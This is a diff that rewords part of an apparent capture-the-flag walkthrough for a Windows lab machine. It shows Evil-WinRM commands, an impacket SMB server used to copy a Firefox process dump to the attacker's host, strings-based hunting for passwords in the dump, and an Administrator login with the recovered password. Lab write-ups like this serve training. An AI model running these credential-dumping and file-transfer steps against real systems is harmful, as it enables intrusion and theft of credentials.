@@ -124,7 +124,7 @@ Check the running processes to see how the administrator checks that issues list
 *Evil-WinRM* PS C:\Users\Chase\Desktop> get-process
 ```
 
-alternative if you want to specify a specific process name:
+Alternatively, if you want to specify a specific process name:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox
@@ -148,16 +148,13 @@ Upload the exe, then:
 
 ## smbserver
 
-Transfer files with smbserver — evil-winrm's download option crawls on big files.
-
-- Create a directory called test
-- Start hosting the smbserver:
+Transfer files with smbserver — evil-winrm's download option crawls on big files. Create a directory called test and start hosting the smbserver:
 
 ```sh
 impacket-smbserver -smb2support -user test -password test test 'test'
 ```
 
-- mount the share to a local drive:
+Mount the share to a local drive:
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Documents> net use z: \\10.10.16.82\test /user:test test 
@@ -165,11 +162,11 @@ impacket-smbserver -smb2support -user test -password test test 'test'
 The command completed successfully. 
 ```
 
-- `z:` -> drive name that the share connected to (can give random letters)
+`z:` is the drive name that the share connected to (can give random letters).
 
 ---
 Note:
-- To check the newly connected entries (connected drive list)
+- To check the newly connected entries (connected drive list):
 
 ```powershell
 *Evil-WinRM* PS C:\Users\Chase\Documents> net use
@@ -188,17 +185,13 @@ Once connected:
 *Evil-WinRM* PS C:\Users\Chase\Documents> copy firefox.dmp z:\
 ```
 
-To examine: `strings` over the .dmp, hunting for **password**:
+To examine: run `strings` over the .dmp, hunting for **password**:
 
 ```sh
 strings firefox.dmp | less
 ```
 
-Why would it be in there?
-
-- It holds the login request made
-- The application stores credentials in memory without encryption
-- When a process dump is created, it captures everything in RAM at that moment
+Why would it be in there? It holds the login request made, the application stores credentials in memory without encryption, and when a process dump is created, it captures everything in RAM at that moment.
 
 ```sh
 evil-winrm -i 10.129.96.157 -u 'SupportDesk\Administrator' -p '4dD!5}x/re8]FBuZ'
